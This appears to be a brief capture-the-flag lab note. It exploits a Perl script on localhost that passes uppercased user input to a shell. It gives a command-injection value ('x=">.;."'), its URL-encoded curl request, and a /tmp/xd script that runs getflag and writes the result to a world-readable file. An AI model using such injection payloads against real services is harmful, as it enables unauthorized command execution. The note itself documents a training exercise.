perl script that run commands with unsanitized user input :

Every char will get converted to uppercase, to we can really use commands...

We could however use something like that to make the perl script execute /tmp/xd instead of reading it !!
```
'x=">.;."'
```
We need to encode that correctly : https://www.urlencoder.org/
give us :
```
curl 'localhost:4646?x=%22%3E.%3B.%22'
```

whith this is /tmp/xd:
```
#!/bin/sh

getflag > /tmp/y
chmod 666 /tmp/y
```
